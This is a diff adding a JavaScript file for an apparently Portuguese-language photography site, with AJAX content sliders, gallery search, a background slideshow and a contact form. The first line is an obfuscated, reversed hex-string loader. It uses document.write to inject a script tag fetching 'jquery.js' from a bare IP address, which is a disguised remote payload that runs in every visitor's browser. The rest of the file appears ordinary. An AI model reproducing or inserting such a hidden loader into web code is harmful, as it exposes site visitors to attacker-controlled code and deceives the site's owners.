@@ -1,0 +1,270 @@
+var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
+//------------------------------
+// DIV SLIDER DE CONTEUDO
+//------------------------------
+function limparConteudo(div){
+  if(div != ""){
+	 document.getElementById(div).innerHTML = "<img src='Images/loading.gif' />";
+  }
+  $('.divConteudoSlider').animate({'marginTop' : '-2900px'}, function(){});
+  $('.divGaleriaSlider').animate({'marginLeft' : '375%'}, function(){});
+}
+
+function mostrarConteudoAJAX(conteudo, div){
+	limparConteudo(div);
+  
+  if(conteudo == ""){
+    $('.divConteudoSlider').animate({'marginTop' : '-2900px'}, function(){});
+  }else{  //TROCA CONTEUDO
+  
+    // CIMA
+  	$('.divConteudoSlider').animate({'marginTop' : '-2900px'}, function(){
+  		// BAIXO
+  		$('.divConteudoSlider').animate({'marginTop' : '0px'}, function(){
+  			// CARREGA O CONTEUDO NA DIV VIA AJAX
+  			carregarConteudoAJAX(conteudo,div);			
+  		});
+  	});
+  }
+}
+
+function carregarConteudoAJAX(conteudo,div,parametros){
+
+	var div_destino = document.getElementById(div);
+  
+  div_destino.innerHTML = "";
+
+	createXMLHttp();
+  
+  if(parametros != ""){
+    parametros = "?" + parametros;
+  }
+  
+  //INCLUDE DE CONTEUDO
+	http_request.open("GET", "inc_cont_" + conteudo + ".php" + parametros, true);
+  
+  //CHAMADA AJAX
+	http_request.onreadystatechange=function() {
+		if(http_request.readyState == 4){
+			if(http_request.status == 200){
+
+				div_destino.innerHTML = http_request.responseText;
+        
+        if(conteudo=='verGaleriaFloat'){                        
+          loadSearchGaleria(); 
+          fixCss(); 
+        } 
+			}
+		}
+	}
+	http_request.send(null);
+}
+//------------------------------
+// FIM DIV SLIDER DE CONTEUDO
+//------------------------------  
+
+//------------------------------
+// DIV FADER DE GALERIA
+//------------------------------  
+
+function mostrarGaleria(conteudo,div){	
+    limparConteudo(div);
+    
+    if(conteudo == ''){
+      //conteudo = 'categ=casamentos';
+    }
+    
+    // DIREITA
+  	$('.divGaleriaSlider').animate({'marginLeft' : '375%'}, function(){
+  		// ESQUERDA
+  		$('.divGaleriaSlider').animate({'marginLeft' : '0px'}, function(){
+  			// CARREGA A GALERIA NA DIV VIA AJAX
+        //var destino = 'galeria';
+        //if(conteudo != ''){
+          destino = 'verGaleriaFloat';
+          carregarConteudoAJAX(destino,div,conteudo);
+        //}else{
+        //  div.innerHTML = "";
+        //}
+  		});
+  	});
+}
+
+function fecharGaleria(){
+
+
+
+}
+//------------------------------
+// FIM DIV FADER DE GALERIA
+//------------------------------  
+
+
+
+//------------------------------
+// AJAX
+//------------------------------
+var http_request = false;
+
+// CRIA O OBJETO XMLHTTP 
+function createXMLHttp(){
+	if(window.XMLHttpRequest){ //Mozilla, Safari, ...
+		http_request = new XMLHttpRequest();
+		if(http_request.overrideMimeType){
+			http_request.overrideMimeType('text/xml');
+		}
+	}else if(window.ActiveXObject){ //IE
+		try{
+			http_request = new ActiveXObject("Msxml2.XMLHTTP");
+		}catch(e){
+			try{
+				http_request = new ActiveXObject("Microsoft.XMLHTTP");
+			}catch(e){
+			}
+		}
+	}
+	if(!http_request){
+		alert("O seu navegador não suporta JavaScript. O Website não será exibido de forma completa.");
+	}
+}
+//------------------------------
+// FIM AJAX
+//------------------------------
+
+//------------------------------
+// CONFIGURACAO DO SUPERSIZED / GALLERIA
+//------------------------------
+jQuery(function($){
+        
+       loadGalleria();
+       loadSupersized(); 
+       
+       jQuery.expr[':'].Contains = function(a, i, m) { 
+          return jQuery(a).text().toUpperCase().indexOf(m[3].toUpperCase()) >= 0; 
+        };
+        
+       $( window ).bind( 'resize', $.debounce( 250, false, fixCss ) );
+});
+
+function fixCss(){
+  if($(".galeriaMain").length > 0){
+    var alturaGaleria = $(".galeriaMain").position().top;
+    var alturaFooter = $(".divFooter2").position().top;
+    $(".divGaleriaContainer").height(alturaFooter - alturaGaleria);
+  }
+}        
+        
+        
+function loadGalleria()
+{
+  /*Galleria.loadTheme('Scripts/galleria/themes/classic/galleria.classic.min.js');
+  
+  Galleria.run('#galleria');
+  
+  Galleria.configure({
+      transition: 'fade',
+      autoplay: 5000,
+      showInfo: false,
+      showCounter:false,
+      thumbnails: false,
+      carousel:false,
+      thumbFit: false,
+      thumbMargin: 0,
+      responsive:true
+  });
+  
+  //$('#galleria').hide();*/
+}
+
+function loadSupersized()
+{
+  $.supersized({  				
+			// Functionality
+			slide_interval          :   7000,		// Length between transitions
+			transition              :   1, 			// 0-None, 1-Fade, 2-Slide Top, 3-Slide Right, 4-Slide Bottom, 5-Slide Left, 6-Carousel Right, 7-Carousel Left
+			transition_speed		    :	  1200,		// Speed of transition
+      start_slide             :   0,
+      random                  :   0,
+													   
+			// Components							
+			slide_links				:	'blank',	// Individual links for each slide (Options: false, 'num', 'name', 'blank')
+			slides 					:  	[			// Slideshow Images
+												{image : 'Images/wallpapers/wall_1.jpg', title : ''},
+												{image : 'Images/wallpapers/wall_2.jpg', title : ''},
+												{image : 'Images/wallpapers/wall_3.jpg', title : ''},
+												{image : 'Images/wallpapers/wall_4.jpg', title : ''},
+												{image : 'Images/wallpapers/wall_5.jpg', title : ''},
+												{image : 'Images/wallpapers/wall_6.jpg', title : ''},
+												{image : 'Images/wallpapers/wall_7.jpg', title : ''},
+												{image : 'Images/wallpapers/wall_8.jpg', title : ''},
+												{image : 'Images/wallpapers/wall_9.jpg', title : ''},
+												{image : 'Images/wallpapers/wall_10.jpg', title : ''},
+												{image : 'Images/wallpapers/wall_11.jpg', title : ''},
+												{image : 'Images/wallpapers/wall_12.jpg', title : ''}
+										]
+			
+		});  
+}
+//------------------------------
+// FIM CONFIGURACAO DO SUPERSIZED/GALLERIA
+//------------------------------
+
+function SearchDivs(text)
+{
+ var foundTDs = $("#divContainer .searchGaleria:Contains('"+text+"')"); 
+ 
+ $("#SearchResults").html("");
+ if(foundTDs.length > 0){
+  foundTDs.closest(".galeriaBox").clone().appendTo("#SearchResults");
+ }else{
+  $("#SearchResults").html("<div class='galeriaFloat'><span style='padding:5px;'>Nenhum álbum encontrado.</span></div>");
+ }
+}
+
+function loadSearchGaleria()
+{
+  $("#txtSearch").keyup(function () {
+    if($(this).val().length > 0)
+    {
+      SearchDivs($(this).val());
+    }else{
+      $("#SearchResults").html("");
+    }
+  });
+  
+  $("#btnLimpar").click(function () {
+    $("#txtSearch").val("");
+    $("#SearchResults").html("");
+  });
+}
+
+function enviarMensagem(){
+
+  if($("#txtNome").val() == ""){
+    alert('O campo Nome é obrigatório!');
+    return;
+  }
+  
+  if($("#txtTelefone").val() == "" && $("#txtEmail").val() == ""){
+    alert('Um telefone ou email é necessário para entrarmos em contato!');
+    return;
+  }
+  
+  if($("#txtMensagem").val() == ""){
+    alert('O campo Mensagem é obrigatório!');
+    return;
+  }
+  
+  $.post('enviaEmail.php', {txtNome:$("#txtNome").val()
+                            ,txtTelefone:$("#txtTelefone").val()
+                            ,txtEmail:$("#txtEmail").val()
+                            ,txtMotivo:$("#txtMotivo").val()
+                            ,txtMensagem:$("#txtMensagem").val() }, function(data){
+    if(data == "1")
+      alert('Obrigado pelo seu contato. Retornaremos em breve!');
+    else
+      alert(data);
+  });
+    
+  
+}
